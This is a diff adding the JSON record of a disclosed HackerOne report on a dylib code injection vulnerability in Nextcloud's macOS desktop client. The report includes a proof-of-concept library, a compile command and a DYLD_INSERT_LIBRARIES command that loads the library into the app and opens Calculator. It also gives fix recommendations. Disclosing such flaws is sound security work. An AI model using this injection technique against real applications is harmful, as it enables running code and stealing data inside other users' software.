@@ -1,0 +1,144 @@
+{
+  "id": 633266,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzMyNjY=",
+  "url": "https://hackerone.com/reports/633266",
+  "title": "Code injection in macOS Desktop Client ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "low",
+  "readable_substate": "Resolved",
+  "created_at": "2019-07-01T17:16:28.195Z",
+  "submitted_at": "2019-07-01T17:16:28.195Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "r3ggi-on-h1",
+    "url": "/r3ggi-on-h1",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8140"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-04-10T09:13:36.619Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-03-11T09:13:34.600Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Vulnerability description\n\nI've identified a code injection vulnerability in your macOS desktop client. Any malicious application, running with standard user permissions is able to exploit this vulnerability and execute code in your application's context.\n\n## Requirements\nIn order to exploit this vulnerability, a victim has to have a malicious application installed on the device.\n\n## Proof of Concept\nTo show you the impact I've prepared a proof of concept where malicious application without root permissions is able to inject to Nextcloud process and open the calculator.\n\n### 1. At first, create a malicious dylib (malicious.m) with following contents:\n```objc\n#include <Foundation/Foundation.h>\n\n__attribute__((constructor)) static void pwn() {\n    \n   puts(\"\\n\\nHELLO FROM THE DYLIB!\\n\\n\");\n    \n   NSTask *task = [[NSTask alloc] init];\n   task.launchPath = @\"/Applications/Calculator.app/Contents/MacOS/Calculator\";\n   [task launch];\n    \n}\n```\n\n### 2. Compile it using gcc\n```bash\ngcc -dynamiclib -undefined suppress -flat_namespace malicious.m -o malicious.dylib -compatibility_version 10.10.10 -lobjc -framework Foundation\n```\n\n### 3. Inject the library using DYLD environment variable. (This is the easiest way to reproduce the vulnerability)\n```bash\nDYLD_FORCE_FLAT_NAMESPACE=1 DYLD_INSERT_LIBRARIES=./malicious.dylib /Applications/nextcloud.app/Contents/MacOS/nextcloud\n```\n\n### 4. Calculator should be opened as shown on attached screenshot\n\n\n## Recommendations\nAssuming that the desktop client has been compiled using XCode, a developer needs to turn on \"Hardened Runtime\" capability making sure that *Allow DYLD Environment Variables* option is **turned off**. Another way to disallow the DYLD Environement variables is adding a *_RESTRICTED* segment to the application binary.\n\n## References\nPrivilege escalation in Keybase using this technique\nhttps://hackerone.com/reports/470003\n\nApple Docs - Hardened runtime entitlements\nhttps://developer.apple.com/documentation/security/hardened_runtime_entitlements\n\n## Important notes\n* Physical access is **not** required to exploit this vulnerability.\n* Applications do **not** need root permission to open other applications with *DYLD_INSERT_LIBRARIES* enviornment variable -  [execve documentation](https://developer.apple.com/library/archive/documentation/System/Conceptual/ManPages_iPhoneOS/man2/execve.2.html).\n\n## Impact\n\nCode execution in the application's context. Any sensitive resource that may be accessed via the application may be stolen. Attacker is also able to perform any action that user may perform from the app.",
+  "weakness": {
+    "id": 70,
+    "name": "Code Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 520167,
+      "file_name": "nextcloud.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/520/167/9f64b150f4a5182d0b593342b462141f8bd85c21/nextcloud.png?response-content-disposition=attachment%3B%20filename%3D%22nextcloud.png%22%3B%20filename%2A%3DUTF-8%27%27nextcloud.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVTSUFPXI%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T115047Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIEF48g45pEFKAjSl5efGBpDduqb7qt5OX22UCJs6wvYjAiALYMCmB2HBPlXoOAJkhEFMSvhAk2N%2BkOt6h2jz3u3WliqyBQgUEAMaDDAxMzYxOTI3NDg0OSIMpy5dIFzGb2D6JHieKo8FRYhZdmtrRFzlgscw0k8qLS%2FE70w5WABEgQNE4P2fWGbvd1rZncCc08ybiWRz%2BDSC5Zwi0MbtJL41dcCVUhAtcgEuiXjbj1KFH1VmvUP9s3n8h0IXPxE2nMvmfyMSZYYRDAOrge8Q06Ww1trUlgFuIRJqlJCGCi0V4b2ixybINEMT5%2BF6hvxOker6%2BhWq2bFcGa1HXntppkmjJt%2FOZqzFRTGR5P5vjByFz0ex0rEiWMBEQJETgkxJsQn72%2BXPIbDx6HYEIy6NV9SLY4OmsK5codv9k1NpTGsYKzY1ny5ZyHJzlBKRwAm9jPmvXNr3gWimgibT3TyWc7%2B4aUzyg82Iyiu0Hh1282LLOH9rV%2FbMoSyWDTzd2dlsLxUToR7JPlXJOQA1rM8GYy1yvy0NGuvLETQ97rLa76U0B4HZofRURj%2FaAe1hLtUAkq19GnUavPWeLKBzCuUIHGwiGIEoiEdeQL3dtwQRF1luwdFANavlX%2Bzw5dKjamkgWYbzACzBnplyzK%2BwYxVreVnzuJXDzSdYaOrbatIcdbVgllLNRAChrDns6ywEpJTMylmvhc7NZR0IKfkgHAjhgk87%2FNjnaWY346xlj8J2PzVN9ztWgqMgKLcxgAdX8BNJWFXkwIGTA8hEy6o8eZEI%2BhlV%2FAUXEKe4SupH16BnN1QXa98j60o3CuP%2Bsuiskf7GOsbXoyZ1F6ahADtQZ0ubgloaIChDsOYioqvnlj6MferB0Z02I%2BxlMM5SgeaUrYVSn1OFWdx9C5U%2F5tYcOMtNzsZLFze6uLcL3fdB4oyY2s3Un%2F7sL4HmplUtaBchd%2Fopk529rJEUEIbT6cGms8l8QcPz4rx93CYZ7%2Bay1uOnmODdcpMYzWSpETC%2BpL%2FGBjqyAZkwCJDl3lHc%2BaxSQGTF2mm38%2FppfzOvCSSoKC1ONqD333YFEjTWHsKRYiPEw1md7tLQTUb0B7wasGEa5vXpmz4osoEYPxFgwUPx%2B55owR1PUOC7P2LnG6sP8ZVGwg%2FvFLnhq9HJyEXf6G%2FfIRz8mfrieWz5UlymzftnGyysH04GJsLgSiEbN%2B0HeYpYcdXZZmu4kBwIE53HgdZIomh6OExLj6yl0JcVJP7VOR8YJrINLRg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7416ac948de28210c31e28944f75dcf3c540ec0ea6c19dab4317e437d50a3eae",
+      "file_size": 53213,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-04-10T09:13:34.688Z",
+  "allow_singular_disclosure_after": -171945432.84655958,
+  "singular_disclosure_allowed": true,
+  "vote_count": 28,
+  "voters": [
+    "cxzer0",
+    "a_d_a_m",
+    "ali",
+    "bl4de",
+    "what_web",
+    "0xm1racle",
+    "happyhacking",
+    "11_elevens",
+    "walter1337",
+    "cc8461",
+    "and 18 more..."
+  ],
+  "severity": {
+    "rating": "low",
+    "score": 3.8,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "high",
+      "privileges_required": "high",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "low",
+      "integrity": "low",
+      "availability": "low"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 77,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "Desktop Client",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
